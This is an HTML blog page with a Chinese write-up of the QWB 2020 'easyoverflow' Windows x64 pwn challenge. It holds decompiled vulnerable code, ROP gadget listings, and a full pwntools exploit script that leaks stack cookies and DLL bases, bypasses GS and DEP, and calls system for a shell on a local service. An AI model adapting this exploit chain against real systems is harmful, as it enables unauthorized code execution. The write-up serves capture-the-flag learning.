@@ -1,0 +1,511 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>强网杯2020 easyoverflow | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="我讨厌windows">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="强网杯2020 easyoverflow"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 强网杯2020 easyoverflow</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 我讨厌windows
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p><img src="/EXP_FILE/a15bee592aac18b05e22dcae4e48850f_MD5.jpeg"><br>打开了DEP、GS、dynamicbase、SEH</p>
+<p>程序比较简单，有三次栈溢出，并通过puts打印到屏幕上</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  FILE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  FILE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
+  <span class="token keyword">char</span> DstBuf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-118h] BYREF</span>
+
+  v3 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v5 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token operator">--</span>v6<span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> DstBuf<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"buffer:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>dll 版本是 Windows Server 2019</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><ul>
+<li>第一轮<br>第一次必然是要泄露 StackCookie 值，填充到 StackCookie 处通过puts()连带泄露<br>第二次泄露程序基址，因为程序未返回，所以覆盖 StackCookie 也不会crash</li>
+</ul>
+<p>x64PE传参是通过<code>rcx、rdx、r8、r9</code>，exe里的gadget太少无法ROP</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>easyoverflow<span class="token operator">></span> python <span class="token punctuation">..</span><span class="token punctuation">\</span>ROPgadget.py <span class="token parameter variable">--binary</span> <span class="token string">'.\StackOverflow.exe'</span> <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span>
+Gadgets information
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x00000001400017ee <span class="token builtin class-name">:</span> pop rbp <span class="token punctuation">;</span> ret
+0x00000001400010c9 <span class="token builtin class-name">:</span> pop rbx <span class="token punctuation">;</span> ret
+0x00000001400014ed <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret
+0x000000014000133d <span class="token builtin class-name">:</span> pop rdi <span class="token punctuation">;</span> ret
+0x00000001400014ee <span class="token builtin class-name">:</span> pop rsi <span class="token punctuation">;</span> pop rbx <span class="token punctuation">;</span> ret
+0x00000001400010ca <span class="token builtin class-name">:</span> ret
+0x0000000140001818 <span class="token builtin class-name">:</span> ret <span class="token number">0</span>
+0x0000000140001723 <span class="token builtin class-name">:</span> ret 0x8348
+0x0000000140001643 <span class="token builtin class-name">:</span> ret 0xb70f
+0x0000000140001678 <span class="token builtin class-name">:</span> ret 0xeb28
+0x0000000140001d12 <span class="token builtin class-name">:</span> ret <span class="token number">3</span>
+
+Unique gadgets found: <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第三次返回main()，我们把目标转向 ntdll.dll 来寻找可用的gadget</p>
+<ul>
+<li><p>第二轮<br>第一次继续连带泄露 StackCookie<br>第二次仍然可以连带泄露 ntdll.dll，泄露了ntdll我们就有了大量可用的gadget<br><img src="/EXP_FILE/969649698b9df3f6b6c76f3367d67426_MD5.jpeg"><br>第三次肯定是继续回到main()上啦</p>
+</li>
+<li><p>第三轮<br>第一次继续连带泄露 StackCookie3<br>第二次paddings<br>第三次使用 ret2dll 泄露 ucrtbase.dll，并通过 rbx 控制循环</p>
+</li>
+</ul>
+<p>只能找到<code>call puts;</code>，因此需要找其他方式来使程序泄露基址后仍能劫持程序流到 main()；我们注意到 do…while 循环是判断 rbx 来进行循环的，如果能提前控制rbx的值就能实现无限循环：<br><img src="/EXP_FILE/d925857c969e6159a5fe8693b2a2fa3b_MD5.jpeg"></p>
+<p>控制了循环，第四次走system getshell…果真如此吗？</p>
+<p>对StackCookie3的校验失败：<br><img src="/EXP_FILE/6e13a500a656e33bfd4cff487f482655_MD5.jpeg"><br>这是由于通过 rbx 控制循环导致了 new_rsp 与泄露 StackCookie3 时的 old_rsp 不同，<code>StackCookie3 ^ new_rsp != __security_cookie</code></p>
+<p>既然要走ret2dll，rsp的变动是无法避免的，要得到新的 StackCookie 就需要泄露栈值和__security_cookie：我们可以 ret2dll 泄露__security_cookie，再与 StackCookie3 异或得到 old_rsp</p>
+<ul>
+<li>第三轮正确操作<br>第一次继续连带泄露 StackCookie3<br>第二次paddings<br>第三次使用 ret2dll 泄露__security_cookie，并通过 rbx 控制循环，通过异或得到 old_rsp，从而计算出任意rsp的StackCookie<br>第四次 ret2dll 泄露 ucrtbase，并通过 rbx 控制循环<br>第五次走 system getshell</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">    <span class="token comment">#!/usr/bin/env python3</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token comment">#@Author:X1NRI</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
+
+s	 <span class="token operator">=</span> <span class="token keyword">lambda</span> payload		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload	<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload	<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>
+ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>
+rl	 <span class="token operator">=</span> <span class="token keyword">lambda</span> 				<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>	
+itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> 				<span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> 				<span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s				<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr 	<span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#------------------------------------------------------------------</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">1234</span><span class="token punctuation">)</span>
+
+<span class="token comment">#1----leak StackCookie</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+StackCookie<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+lg<span class="token punctuation">(</span><span class="token string">'StackCookie'</span><span class="token punctuation">,</span>StackCookie<span class="token punctuation">)</span>
+
+<span class="token comment">#-----leak bbase</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x18</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+btext<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x2f4</span>
+lg<span class="token punctuation">(</span><span class="token string">'btext'</span><span class="token punctuation">,</span>btext<span class="token punctuation">)</span>
+
+<span class="token comment">#------ret main</span>
+main<span class="token operator">=</span>btext
+
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+<span class="token comment">#2------leak StackCookie2</span>
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+StackCookie2<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+lg<span class="token punctuation">(</span><span class="token string">'StackCookie2'</span><span class="token punctuation">,</span>StackCookie2<span class="token punctuation">)</span>
+
+<span class="token comment">#-----leak ntdll</span>
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x180</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+ntdll<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x69271</span>
+lg<span class="token punctuation">(</span><span class="token string">'ntdll'</span><span class="token punctuation">,</span>ntdll<span class="token punctuation">)</span>
+
+rcx<span class="token operator">=</span><span class="token number">0x000000018009217b</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdll
+rdx<span class="token operator">=</span><span class="token number">0x0000000180057652</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdll
+r8<span class="token operator">=</span><span class="token number">0x000000018002010b</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdll
+rbx<span class="token operator">=</span><span class="token number">0x00000001800011a4</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ntdll
+
+<span class="token comment">#------ret main</span>
+payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie2<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+
+<span class="token comment">#3------leak StackCookie3</span>
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+StackCookie3<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+lg<span class="token punctuation">(</span><span class="token string">'StackCookie3'</span><span class="token punctuation">,</span>StackCookie3<span class="token punctuation">)</span>
+
+<span class="token comment">#-------paddings</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span><span class="token string">'X1NRI'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#-------leak __security_cookie</span>
+call_puts<span class="token operator">=</span><span class="token number">0x00000001400010A6</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btext
+__security_cookie_addr<span class="token operator">=</span><span class="token number">0x0000000140003008</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btext
+
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'B'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__security_cookie_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>call_puts<span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+__security_cookie<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+lg<span class="token punctuation">(</span><span class="token string">'__security_cookie'</span><span class="token punctuation">,</span>__security_cookie<span class="token punctuation">)</span>
+
+
+<span class="token comment">#-------leak ucrtbase</span>
+puts_iat<span class="token operator">=</span><span class="token number">0x0000000140002180</span><span class="token operator">-</span><span class="token number">0x0000000140001000</span><span class="token operator">+</span>btext
+old_rsp<span class="token operator">=</span>StackCookie3<span class="token operator">^</span>__security_cookie
+lg<span class="token punctuation">(</span><span class="token string">'old_rsp'</span><span class="token punctuation">,</span>old_rsp<span class="token punctuation">)</span>
+new_rsp<span class="token operator">=</span>old_rsp<span class="token operator">+</span><span class="token number">0x160</span>
+StackCookie<span class="token operator">=</span>new_rsp<span class="token operator">^</span>__security_cookie
+
+payload<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'B'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_iat<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>call_puts<span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+ucrtbase<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7F760</span>
+lg<span class="token punctuation">(</span><span class="token string">'ucrtbase'</span><span class="token punctuation">,</span>ucrtbase<span class="token punctuation">)</span>
+
+<span class="token comment">#-------system</span>
+pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
+new_rsp<span class="token operator">=</span>old_rsp<span class="token operator">+</span><span class="token number">0x2c0</span>
+StackCookie<span class="token operator">=</span>new_rsp<span class="token operator">^</span>__security_cookie
+
+system<span class="token operator">=</span><span class="token number">0x00000001800ABBA0</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ucrtbase
+cmd<span class="token operator">=</span><span class="token number">0x00000001800CC9F0</span><span class="token operator">-</span><span class="token number">0x0000000180001000</span><span class="token operator">+</span>ucrtbase
+payload<span class="token operator">=</span><span class="token string">b'C'</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>StackCookie<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'C'</span><span class="token operator">*</span><span class="token number">0x10</span>
+payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+sa<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+itr<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/07/09/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%20easyoverflow/" class="leancloud-visitors view" data-flag-title="强网杯2020 easyoverflow">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
